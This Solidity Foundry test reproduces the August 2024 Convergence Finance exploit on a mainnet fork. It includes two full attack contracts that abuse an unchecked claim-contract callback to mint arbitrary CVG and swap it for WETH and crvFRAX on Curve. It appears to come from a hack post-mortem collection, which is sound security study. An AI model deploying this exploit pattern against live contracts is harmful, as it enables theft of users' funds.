// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

// Foundry
import {console} from "@forge-std/Console.sol";

// OpenZeppelin
import {IERC20} from "@openzeppelin-contracts/token/ERC20/IERC20.sol";

// Local Interfaces
import {ICVG} from "src/interfaces/ICVG.sol";
import {ICurvePoolCVGETH} from "src/interfaces/ICurvePoolCVGETH.sol";
import {ICurvePoolCVGCRVFRAX} from "src/interfaces/ICurvePoolCVGCRVFRAX.sol";
import {ICvxRewardDistributor} from "src/interfaces/ICVXRewardDistributor.sol";

// Local Libraries
import {Mainnet} from "src/utils/Addresses.sol";
import {Constants} from "src/utils/Constants.sol";

// Base for tests
import {Contracts} from "src/utils/Contracts.sol";
import {Base_Test_} from "src/Base.sol";

/**
 * KeyInfo - Total Lost :       180k$
 * Protocol Attacked:           Convergence Finance (https://app.cvg.finance)
 * Attacker:                    0x03560A9D7A2c391FB1A087C33650037ae30dE3aA
 * Attack Contract:             0xee45384d4861b6fb422dfa03fbdcc6e29d7beb69
 * Vulnerable Contract:         0x47c69e8c909ce626af73c955a5e34a20b7c71f19 (used in proxy 0x2b083beaac310cc5e190b1d2507038ccb03e7606 )
 * Attack tx:                   0xe1c76241dda7c5fcf1988454c621142495640e708e3f8377982f55f8cf2a8401
 * Attack block:                20434450
 * Blockchain:                  Ethereum
 * Vulnerable Contract Code:    https://vscode.blockscan.com/ethereum/0x47c69e8c909ce626af73c955a5e34a20b7c71f19
 *
 * Analysis
 * Post-mortem:
 * Twitter Guy:                 https://x.com/DecurityHQ/status/1819030089012527510
 * Hacking God:
 *
 * Explanation:
 * The attacker exploited a vulnerability in the claimMultipleStaking function of
 * the CVX Reward Distributor contract, by minting an arbitrary amount of CVG tokens.
 * Everything happens in the constructor of the Attack_Contract_1 contract.
 * 1. The attacker deployed the Attack_Contract_1 contract, which deployed the Attack_Contract_2 contract.
 * 2. The Attack_Contract_1 contract called the claimMultipleStaking function of the rewardDistributor, using the Attack_Contract_2 as the claim contract.
 * 3. The claimCvgCvxMultiple call the Attack_Contract_2 contract to know the amount of CVG to mint. (There is the error).
 * 4. The reward contract mint the desired amount of CVG tokens to the Attack_Contract_1 contract.
 * 5. The Attack_Contract_1 contract swapped the CVG tokens for WETH and CRVFRAX on Curve.
 *
 * Note: Don't forget to set the FOUNDRY_EVM_VERSION to shanghai before running the test.
 */
contract Hack_Convergence is Base_Test_ {
    //////////////////////////////////////////////////////
    /// --- CONSTANTS & IMMUTABLES
    //////////////////////////////////////////////////////
    uint256 public constant ATTACK_BLOCK_NUMBER = 20434450;

    address public immutable ATTACKER = 0x03560A9D7A2c391FB1A087C33650037ae30dE3aA;

    //////////////////////////////////////////////////////
    /// --- ATTACK CONTRACT
    //////////////////////////////////////////////////////
    Attack_Contract_1 public attackContract1;
    Attack_Contract_2 public attackContract2;

    //////////////////////////////////////////////////////
    /// --- SETUP
    //////////////////////////////////////////////////////
    function setUp() public override {
        super.setUp();

        // Create a fork of the mainnet
        vm.createSelectFork("mainnet", ATTACK_BLOCK_NUMBER - 1);
    }

    function test_ConvergenceFinance_Attack_2024_08_01() public {
        vm.prank(ATTACKER);
        attackContract1 = new Attack_Contract_1();

        console.log("CVG balance of attacker: %e", CVG.balanceOf(ATTACKER));
        console.log("WETH balance of attacker: %e", WETH.balanceOf(ATTACKER));
        console.log("CRVFRAX balance of attacker: %e", CRVFRAX.balanceOf(ATTACKER));
    }
}

contract Attack_Contract_1 {
    ICVG public cvg = ICVG(Mainnet.CVG);
    IERC20 public WETH = IERC20(Mainnet.WETH);
    IERC20 public CRVFRAX = IERC20(Mainnet.CRVFRAX);
    Attack_Contract_2 public attackContract2;
    ICvxRewardDistributor public cvxRewardDistributor =
        ICvxRewardDistributor(0x2b083beaaC310CC5E190B1d2507038CcB03E7606);
    ICurvePoolCVGETH public curvePoolCVGETH = ICurvePoolCVGETH(0x004C167d27ADa24305b76D80762997Fa6EB8d9B2);
    ICurvePoolCVGCRVFRAX public curvePoolCVGCRVFRAX =
        ICurvePoolCVGCRVFRAX(payable(0xa7B0E924c2dBB9B4F576CCE96ac80657E42c3e42));

    constructor() {
        // 1. Deploy the second attack contract that will be caled by the vulnerable function
        attackContract2 = new Attack_Contract_2();

        // 2. Create list of claim contracts, with only the second attack contract
        address[] memory claimContracts = new address[](1);
        claimContracts[0] = address(attackContract2);

        // 3. Call the vulnerable function
        cvxRewardDistributor.claimMultipleStaking({
            claimContracts: claimContracts,
            _account: address(this),
            _minCvgCvxAmountOut: 1,
            _isConvert: true,
            cvxRewardCount: 1
        });

        // 5. Now we have the CVG tokens
        uint256 cvgBalance = cvg.balanceOf(address(this)); // 58,718,395.056818121904518498

        // 5. Let swap the CVG tokens for ETH and crvFRAX
        uint256 firstSwap = 52_846_555_551136309714066648; // fetched from attack tx
        uint256 secondSwap = cvgBalance - firstSwap;
        // Approvals
        cvg.approve(address(curvePoolCVGETH), firstSwap);
        cvg.approve(address(curvePoolCVGCRVFRAX), secondSwap);
        // Swaps
        curvePoolCVGETH.exchange(1, 0, firstSwap, 0, msg.sender);
        curvePoolCVGCRVFRAX.exchange(0, 1, secondSwap, 0, false, msg.sender);

        // Check the balances are empty
        require(WETH.balanceOf(address(this)) == 0, "WETH balance not empty");
        require(CRVFRAX.balanceOf(address(this)) == 0, "CRVFRAX balance not empty");
        require(cvg.balanceOf(address(this)) == 0, "CVG balance not empty");
    }
}

contract Attack_Contract_2 {
    struct TokenAmount {
        IERC20 token;
        uint256 amount;
    }

    // Just return the amount to claim, free money!
    function claimCvgCvxMultiple(address)
        public
        view
        returns (uint256 cvgClaimable, TokenAmount[] memory _cvxRewards)
    {
        return (type(uint256).max - ICVG(Mainnet.CVG).mintedStaking(), new TokenAmount[](0));
    }
}
